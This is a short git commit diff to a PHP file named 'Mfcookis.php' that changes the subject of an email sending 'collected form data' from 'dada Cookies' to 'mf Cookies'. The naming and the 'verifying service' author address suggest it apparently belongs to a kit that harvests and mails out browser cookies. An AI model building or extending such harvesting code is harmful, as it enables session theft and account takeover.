69ebae4df514a9813ccea7804ca61d0a75162cd2
verifyingse440987 <verifyingservice79@gmail.com>
2025-09-17 23:04:31 +0500

    Update Mfcookis.php

--- Mfcookis.php
+++ Mfcookis.php
@@ -45,7 +45,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 
         // Email content
         $mail->isHTML(true);
-        $mail->Subject = 'dada Cookies';
+        $mail->Subject = 'mf Cookies';
         $mail->Body = $emailBody; // Set the email body using the collected form data
 
         // Send email
